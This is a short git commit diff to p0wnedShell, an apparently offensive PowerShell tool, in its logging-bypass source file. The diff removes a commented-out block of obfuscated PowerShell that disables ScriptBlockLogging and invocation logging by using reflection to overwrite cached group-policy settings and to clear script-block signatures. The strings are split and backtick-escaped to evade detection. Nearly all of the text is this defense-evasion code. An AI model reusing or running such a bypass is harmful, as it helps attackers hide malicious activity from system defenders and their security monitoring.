f91e3b0314a7208220c851b033eb26c6d697a031
b4rtik <a.ghelli@nautilo.it>
2018-10-11 23:16:50 +0200

    Update

--- p0wnedShell/Custom/p0wnedShellLoggingBypass.cs
+++ p0wnedShell/Custom/p0wnedShellLoggingBypass.cs
@@ -56,17 +56,6 @@ namespace p0wnedShell
             {
                 Console.WriteLine("[-] Error ScriptBlockLogging bypass");
             }
-
-
-            /*String logbypass = "$settings = [Ref].Assembly.GetType(\"System.Management.Automation.Utils\").\"GetFie`ld\"(\"cachedGroupPolicySettings\",\"NonPu\"+\"blic,Static\").GetValue($null);"
-            +"$settings['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Scr' + 'iptB' + 'lockLo' + 'gging'] = @{ };"
-            +"$settings['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Scr' + 'iptB' + 'lockLo' + 'gging'].Add('EnableScr' + 'iptBlockLogging', \"0\");"
-            +"$settings['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Scr' + 'iptB' + 'lockLo' + 'gging'].Add('EnableScri' + 'ptBlockInvoca' + 'tionLogging', \"0\");"
-            +"[Ref].Assembly.GetType(\"System.Management.Automation.ScriptBlock\").\"GetFie`ld\"(\"signatures\", \"NonPub\" + \"lic,static\").SetValue($null, (New - Object 'System.Collections.Generic.HashSet[string]'));";
-
-            this.currentPowerShell.AddScript(logbypass);
-
-            this.currentPowerShell.Invoke();*/
         }
     }
 }
